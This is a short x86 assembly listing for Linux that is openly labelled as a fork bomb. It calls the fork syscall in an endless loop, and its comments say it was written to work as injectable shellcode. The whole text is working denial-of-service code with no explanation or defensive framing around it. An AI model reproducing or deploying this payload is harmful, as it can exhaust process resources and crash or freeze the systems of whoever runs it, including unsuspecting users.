section .text
 global _start ;Call start
 
_start:
 push byte 2      ;syscall to Linux fork
 pop eax          ;set EAX argument for fork to NULL [So it works in strings]
 int 0x80         ;Execute syscall with fork & the EAX [null, above] argument
 jmp short _start ;Go back to beginning, causing a fork bomb
